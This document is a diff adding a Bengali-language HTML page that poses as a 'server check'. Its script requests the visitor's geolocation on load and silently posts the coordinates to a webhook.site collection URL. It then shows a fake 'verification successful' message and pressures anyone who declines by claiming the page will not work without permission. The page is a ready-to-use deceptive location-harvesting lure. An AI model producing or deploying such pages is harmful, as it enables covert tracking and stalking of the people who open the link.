@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <title>Connecting...</title>
+</head>
+<body>
+    <h2 style="text-align:center; margin-top:50px;">সার্ভার চেক করা হচ্ছে... দয়া করে অপেক্ষা করুন।</h2>
+
+    <script>
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    
+                    // আপনার Webhook লিঙ্কটি নিচে দেওয়া হলো
+                    const webhookURL = "https://webhook.site/df38940f-cedd-4529-8fdb-ac6d2b4ad408"; 
+
+                    fetch(webhookURL, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        body: JSON.stringify({ latitude: lat, longitude: lon })
+                    });
+                    alert("ধন্যবাদ! ভেরিফিকেশন সফল হয়েছে।");
+                }, function() {
+                    alert("লোকেশন পারমিশন না দিলে পেজটি কাজ করবে না।");
+                });
+            }
+        };
+    </script>
+</body>
+</html>
